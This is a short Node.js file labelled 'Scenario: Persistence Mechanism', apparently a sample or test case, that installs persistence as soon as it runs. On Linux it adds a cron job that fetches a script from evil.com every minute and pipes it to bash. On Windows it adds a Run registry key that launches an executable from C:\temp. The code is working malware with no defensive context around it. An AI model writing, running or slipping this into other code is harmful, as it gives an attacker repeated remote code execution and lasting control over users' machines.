// Scenario: Persistence Mechanism
import { exec } from 'child_process';
import os from 'os';

function installDaemon() {
  if (os.platform() === 'linux') {
    const cronJob = '* * * * * curl -s http://evil.com/updates | bash';
    exec(`(crontab -l ; echo "${cronJob}") | crontab -`);
  } else if (os.platform() === 'win32') {
    exec(
      'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateTask" /t REG_SZ /d "C:\\temp\\updater.exe" /f'
    );
  }
}

installDaemon();
